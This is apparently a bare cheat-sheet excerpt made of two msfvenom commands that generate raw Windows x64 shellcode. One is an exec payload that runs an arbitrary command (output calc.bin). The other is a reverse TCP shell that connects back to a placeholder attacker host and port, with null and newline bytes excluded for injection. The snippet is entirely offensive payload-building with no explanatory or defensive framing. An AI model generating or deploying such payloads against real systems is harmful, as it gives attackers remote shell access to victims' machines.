```
msfvenom --platform windows --arch x64 \ -p windows/x64/exec CMD=<command> \ -b '\x00\x0A\x0D' \ -f raw \ -o calc.bin
```

```
msfvenom --platform windows --arch x64 \ -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT \ -b '\x00\x0A\x0D' \ -f raw \ -o reverse.bin
```